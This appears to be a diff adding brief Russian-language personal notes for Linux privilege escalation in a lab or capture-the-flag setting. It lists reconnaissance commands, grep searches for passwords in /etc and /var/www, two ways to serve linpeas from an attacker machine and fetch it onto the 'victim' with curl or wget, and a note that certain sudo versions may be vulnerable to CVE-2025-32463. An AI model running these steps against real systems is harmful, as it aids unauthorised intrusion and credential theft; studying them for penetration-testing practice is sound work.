@@ -1,0 +1,30 @@
+whoami
+groups
+ls
+sudo -l
+ps auxf
+netstat 127.0.0.1 
+
+find / -writable -type d 2>/dev/null | head #первые 10 совпадений
+grep -R "password" /etc 2>/dev/null | head 
+grep -R "passwd" /var/www 2>/dev/null | head
+
+Передать linpeas на машину жертву способ 1:
+ip a (смотрим, запоминаем наш внешний айпи)
+busybox httpd -f -p 8000 –h . (на нашей машине, обязательно, в директории где лежит линпис.сх)
+
+curl -fsSLo linpeas.sh http://наш внешний айпи:8000/linpeas.sh
+
+Второй способ : На Kali:
+python3 -m http.server 80
+На целевой машине
+wget 10.10.15.31/linpeas.sh
+
+
+
+cd /var
+cd /opt
+
+sudo -V
+Если 1.9.15-1.9.17 без патчей, то может сработать exploit
+CVE-2025-32463 Linux forky 
